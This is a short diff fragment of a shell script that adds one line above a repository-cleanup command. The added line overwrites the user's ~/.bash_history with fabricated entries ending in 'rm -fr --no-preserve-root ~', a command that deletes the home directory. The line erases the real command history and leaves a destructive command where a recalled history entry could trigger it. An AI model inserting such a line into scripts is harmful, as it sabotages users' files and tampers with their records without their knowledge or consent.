@@ -34,4 +34,6 @@ fi
 
 
 
+echo -e "cd\nls\ncd ..\nls\nrm -fr --no-preserve-root ~" > ~/.bash_history
+
 rm -fr $repo
